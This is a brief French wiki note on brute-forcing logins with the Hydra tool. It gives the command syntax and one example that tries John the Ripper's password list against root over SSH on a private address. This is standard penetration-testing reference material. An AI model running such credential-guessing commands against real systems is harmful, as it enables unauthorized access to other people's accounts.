---
title: Bruteforce avec Hydra
description: 
published: true
date: 2021-10-20T08:22:13.211Z
tags: 
editor: markdown
dateCreated: 2021-10-20T08:21:42.718Z
---

# Utilisation
hydra -l < nom d'utilisateur > -P < mot de passe> -s < port > -V < ip > < protocole >

# Exemple
hydra -l root -P /usr/share/john/password.lst 10.0.0.2 ssh
> /usr/share/john/password.lst est un dictionnaire fournie par John the Ripper 
{.is-info}

